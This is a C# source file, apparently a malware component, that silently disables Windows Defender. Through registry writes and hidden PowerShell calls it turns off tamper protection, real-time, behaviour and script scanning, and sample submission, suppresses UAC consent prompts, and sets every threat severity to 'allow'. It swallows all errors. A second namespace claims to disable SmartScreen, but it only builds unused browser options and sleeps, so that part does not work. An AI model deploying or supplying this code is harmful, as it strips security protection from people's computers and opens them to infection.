using Microsoft.Win32;
using System.Diagnostics;
using OpenQA.Selenium.Edge;
using System.Threading;


namespace DisableWindowsDefender
{
    internal class WindowsDefender
    {
        public static void Disable()
        {
            RegistryEdit("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
            RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
            RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
            RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
            RegistryEdit("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableLUA", "1");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableInstallerDetection", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "PromptOnSecureDesktop", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "ConsentPromptBehaviorAdmin", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableSecureUIAPaths", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableVirtualization", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "FilterAdministratorToken", "0");
            RegistryEdit("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "EnableUIADesktopToggle", "0");
            CheckDefender();
        }
        private static void RegistryEdit(string regPath, string name, string value)
        {
            try
            {
                using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
                {
                    if (registryKey == null)
                    {
                        Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, value, RegistryValueKind.DWord);
                    }
                    else if (registryKey.GetValue(name) != value)
                    {
                        registryKey.SetValue(name, value, RegistryValueKind.DWord);
                    }
                }
            }
            catch
            {
            }
        }
        private static void CheckDefender()
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = "Get-MpPreference -verbose",
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
            while (!process.StandardOutput.EndOfStream)
            {
                string text = process.StandardOutput.ReadLine();
                if (text.StartsWith("DisableRealtimeMonitoring") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableRealtimeMonitoring $true");
                }
                else if (text.StartsWith("DisableBehaviorMonitoring") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableBehaviorMonitoring $true");
                }
                else if (text.StartsWith("DisableBlockAtFirstSeen") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableBlockAtFirstSeen $true");
                }
                else if (text.StartsWith("DisableIOAVProtection") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableIOAVProtection $true");
                }
                else if (text.StartsWith("DisablePrivacyMode") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisablePrivacyMode $true");
                }
                else if (text.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
                }
                else if (text.StartsWith("DisableArchiveScanning") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableArchiveScanning $true");
                }
                else if (text.StartsWith("DisableIntrusionPreventionSystem") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableIntrusionPreventionSystem $true");
                }
                else if (text.StartsWith("DisableScriptScanning") && text.EndsWith("False"))
                {
                    RunPS("Set-MpPreference -DisableScriptScanning $true");
                }
                else if (text.StartsWith("SubmitSamplesConsent") && !text.EndsWith("2"))
                {
                    RunPS("Set-MpPreference -SubmitSamplesConsent 2");
                }
                else if (text.StartsWith("MAPSReporting") && !text.EndsWith("0"))
                {
                    RunPS("Set-MpPreference -MAPSReporting 0");
                }
                else if (text.StartsWith("HighThreatDefaultAction") && !text.EndsWith("6"))
                {
                    RunPS("Set-MpPreference -HighThreatDefaultAction 6 -Force");
                }
                else if (text.StartsWith("ModerateThreatDefaultAction") && !text.EndsWith("6"))
                {
                    RunPS("Set-MpPreference -ModerateThreatDefaultAction 6");
                }
                else if (text.StartsWith("LowThreatDefaultAction") && !text.EndsWith("6"))
                {
                    RunPS("Set-MpPreference -LowThreatDefaultAction 6");
                }
                else if (text.StartsWith("SevereThreatDefaultAction") && !text.EndsWith("6"))
                {
                    RunPS("Set-MpPreference -SevereThreatDefaultAction 6");
                }
            }
        }
        private static void RunPS(string args)
        {
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo
                {
                    FileName = "powershell",
                    Arguments = args,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                }
            };
            process.Start();
        }
    }
}
namespace DisableSmartScreen
{
    class Program
    {
        static void Main(string[] args)
        {
            var options = new EdgeOptions();
            options.AddArgument("--disable-features=msSmartScreenProtection");
            Thread.Sleep(5000);
        }
    }
}
